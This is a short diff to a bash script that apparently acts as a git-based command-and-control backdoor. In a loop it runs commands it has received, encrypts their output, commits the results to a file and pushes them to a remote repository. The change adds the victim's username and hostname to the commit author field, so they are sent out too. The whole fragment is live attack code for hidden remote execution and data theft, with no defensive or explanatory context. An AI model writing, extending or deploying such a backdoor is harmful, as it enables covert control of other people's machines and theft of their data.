@@ -28,7 +28,7 @@ while true; do
 		output=$(bash -c "$dmc")
 		echo $output | openssl enc -aes-256-cbc -base64 -pass pass:$AESK >> ls
 		git add ls
-		GIT_AUTHOR_NAME="New User" GIT_AUTHOR_EMAIL="new.user@example.com" GIT_COMMITTER_NAME="Committer Name" GIT_COMMITTER_EMAIL="committer@example.com" git commit -m "yup"
+		GIT_AUTHOR_NAME="$(whoami)/$(hostname)" GIT_AUTHOR_EMAIL="new.user@example.com" GIT_COMMITTER_NAME="Committer Name" GIT_COMMITTER_EMAIL="committer@example.com" git commit -m "yup"
 		git push
 		LAST_COMMAND=$dmc
 	fi
